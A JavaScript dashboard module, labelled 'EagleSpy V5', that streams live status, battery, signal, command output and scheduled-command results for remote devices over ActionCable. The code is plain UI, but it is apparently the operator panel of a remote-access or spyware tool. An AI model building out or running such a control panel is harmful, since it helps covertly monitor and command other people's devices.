/**
 * Real-time Dashboard Module - EagleSpy V5
 *
 * Auto-updates device cards, battery indicators, online/offline status,
 * live notification badges, and command output streaming without page refresh.
 *
 * @module realtime_dashboard
 */

import consumer from '../channels/consumer';

const RECONNECT_DELAY_MS = 3000;
const MAX_RECONNECT_ATTEMPTS = 10;

let subscription = null;
let reconnectAttempts = 0;
let connectionIndicator = null;

/**
 * Initialize real-time dashboard updates.
 * Call this once when the dashboard page loads.
 */
export function initRealtimeDashboard() {
  createConnectionIndicator();
  subscribeToDeviceStatus();
  subscribeToAdminNotifications();
}

/**
 * Subscribe to device status channel for live updates.
 */
function subscribeToDeviceStatus() {
  subscription = consumer.subscriptions.create('DeviceStatusChannel', {
    connected() {
      reconnectAttempts = 0;
      updateConnectionStatus('connected');
      this.perform('request_refresh');
    },

    disconnected() {
      updateConnectionStatus('disconnected');
      scheduleReconnect();
    },

    rejected() {
      updateConnectionStatus('error');
    },

    received(data) {
      switch (data.type) {
        case 'snapshot':
          handleSnapshot(data.devices || []);
          break;
        case 'device_online':
          handleDeviceOnline(data.device);
          break;
        case 'device_offline':
          handleDeviceOffline(data.device);
          break;
        case 'device_update':
          handleDeviceUpdate(data.device);
          break;
        case 'battery_update':
          handleBatteryUpdate(data);
          break;
        case 'command_output':
          handleCommandOutput(data);
          break;
        case 'notification':
          handleNotification(data);
          break;
        default:
          break;
      }
    }
  });
}

/**
 * Subscribe to admin device notifications.
 */
function subscribeToAdminNotifications() {
  // Subscribe to admin devices broadcast channel
  consumer.subscriptions.create({ channel: 'AdminDevicesChannel' }, {
    received(data) {
      switch (data.type) {
        case 'device_info':
          updateDeviceCard(data.device_id, data.data);
          break;
        case 'command_response':
          showToastNotification(`📡 Response from ${data.device_id}`, 'info');
          break;
        case 'pong':
          updateDeviceCard(data.device_id, { last_seen: data.timestamp });
          break;
      }
    }
  });

  // Subscribe to scheduled command notifications
  consumer.subscriptions.create({ channel: 'CommandChannel', device_id: 'admin_broadcast' }, {
    received(data) {
      if (data.type === 'scheduled_commands_executed') {
        showToastNotification(
          `⏰ Executed ${data.count} scheduled command(s): ${data.succeeded} succeeded, ${data.failed} failed`,
          data.failed > 0 ? 'warning' : 'success'
        );
      }
    }
  });
}

// ── Snapshot & Device Update Handlers ──

function handleSnapshot(devices) {
  devices.forEach(function(device) {
    updateDeviceCard(device.device_id, device);
  });
}

function handleDeviceOnline(device) {
  updateDeviceStatus(device.device_id, true);
  showToastNotification(`📱 ${device.device_id} is now online`, 'success');
}

function handleDeviceOffline(device) {
  updateDeviceStatus(device.device_id, false);
  showToastNotification(`📴 ${device.device_id} went offline`, 'warning');
}

function handleDeviceUpdate(device) {
  updateDeviceCard(device.device_id, device);
}

function handleBatteryUpdate(data) {
  var el = findDeviceElement(data.device_id);
  if (!el) return;

  var batteryEl = el.querySelector('.battery-level');
  if (batteryEl) {
    batteryEl.textContent = data.battery_level + '%';
    batteryEl.className = 'battery-level battery-' + getBatteryClass(data.battery_level);
  }
}

function handleCommandOutput(data) {
  var outputEl = document.getElementById('command-output-' + data.device_id);
  if (outputEl) {
    var line = document.createElement('div');
    line.className = 'command-output-line';
    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + (data.output || '');
    outputEl.appendChild(line);
    outputEl.scrollTop = outputEl.scrollHeight;
  }
}

function handleNotification(data) {
  updateNotificationBadge(data.count || 1);
  showToastNotification(data.message || 'New notification', data.level || 'info');
}

// ── DOM Update Helpers ──

function updateDeviceCard(deviceId, data) {
  var el = findDeviceElement(deviceId);
  if (!el) return;

  if (data.online !== undefined) {
    updateDeviceStatus(deviceId, data.online);
  }
  if (data.battery_level !== undefined) {
    updateBatteryDisplay(el, data.battery_level, data.charging);
  }
  if (data.signal_strength !== undefined) {
    updateSignalDisplay(el, data.signal_strength, data.network_type);
  }
}

function updateDeviceStatus(deviceId, isOnline) {
  var el = findDeviceElement(deviceId);
  if (!el) return;

  var statusEl = el.querySelector('.device-status');
  if (statusEl) {
    statusEl.className = 'device-status ' + (isOnline ? 'online' : 'offline');
    var textNode = statusEl.childNodes[statusEl.childNodes.length - 1];
    if (textNode && textNode.nodeType === Node.TEXT_NODE) {
      textNode.textContent = isOnline ? 'Online' : 'Offline';
    }
  }
}

function updateBatteryDisplay(el, level, charging) {
  var existing = el.querySelector('.realtime-battery');
  if (!existing) {
    var meta = el.querySelector('.device-os');
    if (meta) {
      var badge = document.createElement('span');
      badge.className = 'realtime-battery battery-' + getBatteryClass(level);
      badge.textContent = (charging ? '⚡' : '🔋') + ' ' + level + '%';
      meta.appendChild(document.createTextNode(' · '));
      meta.appendChild(badge);
    }
    return;
  }
  existing.textContent = (charging ? '⚡' : '🔋') + ' ' + level + '%';
  existing.className = 'realtime-battery battery-' + getBatteryClass(level);
}

function updateSignalDisplay(el, strength, networkType) {
  var existing = el.querySelector('.realtime-signal');
  if (!existing) {
    var meta = el.querySelector('.device-os');
    if (meta) {
      var badge = document.createElement('span');
      badge.className = 'realtime-signal';
      badge.textContent = getSignalIcon(strength) + ' ' + (networkType || '');
      meta.appendChild(document.createTextNode(' · '));
      meta.appendChild(badge);
    }
    return;
  }
  existing.textContent = getSignalIcon(strength) + ' ' + (networkType || '');
}

function updateNotificationBadge(count) {
  var badge = document.querySelector('.notification-badge');
  if (badge) {
    var current = parseInt(badge.textContent || '0', 10);
    badge.textContent = current + count;
    badge.style.display = 'inline-block';
  }
}

// ── Connection Status Indicator ──

function createConnectionIndicator() {
  if (document.getElementById('ws-connection-status')) return;

  var indicator = document.createElement('div');
  indicator.id = 'ws-connection-status';
  indicator.style.cssText = 'position:fixed;bottom:12px;right:12px;padding:6px 14px;border-radius:20px;' +
    'font-size:12px;font-weight:600;z-index:9999;transition:all 0.3s ease;' +
    'background:#1a1a2e;color:#888;border:1px solid #333;box-shadow:0 2px 8px rgba(0,0,0,0.3);';
  indicator.textContent = '⏳ Connecting...';
  document.body.appendChild(indicator);
  connectionIndicator = indicator;
}

function updateConnectionStatus(status) {
  if (!connectionIndicator) return;

  var styles = {
    connected:    { bg: '#0a2e1a', color: '#4ade80', border: '#166534', text: '🟢 Live' },
    disconnected: { bg: '#2e1a0a', color: '#fb923c', border: '#9a3412', text: '🟠 Reconnecting...' },
    error:        { bg: '#2e0a0a', color: '#f87171', border: '#991b1b', text: '🔴 Disconnected' }
  };

  var s = styles[status] || styles.error;
  connectionIndicator.style.background = s.bg;
  connectionIndicator.style.color = s.color;
  connectionIndicator.style.borderColor = s.border;
  connectionIndicator.textContent = s.text;
}

function scheduleReconnect() {
  if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
    updateConnectionStatus('error');
    return;
  }
  reconnectAttempts++;
  var delay = RECONNECT_DELAY_MS * Math.pow(1.5, reconnectAttempts - 1);
  setTimeout(function() {
    if (subscription) {
      subscription.perform('request_refresh');
    }
  }, Math.min(delay, 30000));
}

// ── Utility Functions ──

function findDeviceElement(deviceId) {
  return document.querySelector('.device-card[data-device-id="' + deviceId + '"]') ||
    (function() {
      var cards = document.querySelectorAll('.device-card');
      for (var i = 0; i < cards.length; i++) {
        var idEl = cards[i].querySelector('[data-device-id]');
        if (idEl && idEl.getAttribute('data-device-id') === deviceId) {
          return cards[i];
        }
        var osEl = cards[i].querySelector('.device-os');
        if (osEl && osEl.textContent.trim() === deviceId) {
          return cards[i];
        }
      }
      return null;
    })();
}

function getBatteryClass(level) {
  if (level <= 15) return 'critical';
  if (level <= 30) return 'low';
  if (level <= 60) return 'medium';
  return 'good';
}

function getSignalIcon(strength) {
  if (strength >= -60) return '📶';
  if (strength >= -80) return '📶';
  if (strength >= -100) return '📡';
  return '📡';
}

function showToastNotification(message, type) {
  if (typeof window.showToast === 'function') {
    window.showToast(message, type);
  }
}

// Auto-initialize when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initRealtimeDashboard);
} else {
  initRealtimeDashboard();
}

export default { initRealtimeDashboard };
